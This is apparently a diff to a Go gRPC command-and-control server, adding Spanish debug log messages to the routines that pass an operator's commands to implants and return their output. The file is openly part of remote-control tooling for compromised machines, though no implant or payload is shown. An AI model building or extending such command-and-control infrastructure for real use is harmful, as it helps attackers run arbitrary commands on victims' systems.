@@ -10,6 +10,8 @@ import (
 	"net"
 )
 
+var l = new(log.Logger)
+
 type implantServer struct {
 	work, output chan *grpcapi.Command
 	grpcapi.ImplantServer
@@ -39,6 +41,7 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 
 	select {
 	case cmd, ok := <-s.work:
+		log.Debug("[+] Comando recibido del administrador.", "CMD", cmd.In)
 		if ok {
 			return cmd, nil
 		}
@@ -50,6 +53,7 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 
 func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
 	s.output <- result
+	log.Debug("[*] Resultado enviado al administrador.")
 	return &grpcapi.Empty{}, nil
 }
 
@@ -58,7 +62,9 @@ func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) 
 	go func() {
 		s.work <- command
 	}()
+	log.Debug("[*] Enviado comando al Servidor.", "CMD", command.In)
 	res = <-s.output
+	log.Debug("[*] Resultado recibido.")
 	return res, nil
 }
 
@@ -75,12 +81,12 @@ func main() {
 	client_addr := ":9090"
 	implant_addr := ":4444"
 	if implantListener, err = net.Listen("tcp", implant_addr); err != nil {
-		log.Print(implantListener)
+		log.Debug(implantListener)
 		log.Fatal("Error en el listener del implant", "ERROR", err)
 	}
 
 	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
-		log.Print(adminListener)
+		log.Debug(adminListener)
 		log.Fatal("Error en el listener del admin", "ERROR", err)
 	}
 
